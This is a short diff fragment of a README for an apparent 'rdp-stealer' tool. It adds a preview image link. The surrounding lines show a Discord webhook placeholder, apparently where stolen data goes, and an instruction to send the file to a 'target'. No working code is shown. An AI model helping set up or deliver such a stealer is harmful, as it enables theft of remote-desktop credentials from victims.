@@ -16,3 +16,4 @@ webhook = DiscordWebhook(url='YOUR WEBHOOK')
 ```
 And if you're finished and ready to go, send the file to your provided target.
 ## Preview
+![](https://github.com/Morph1as/rdp-stealer/blob/main/image.png)
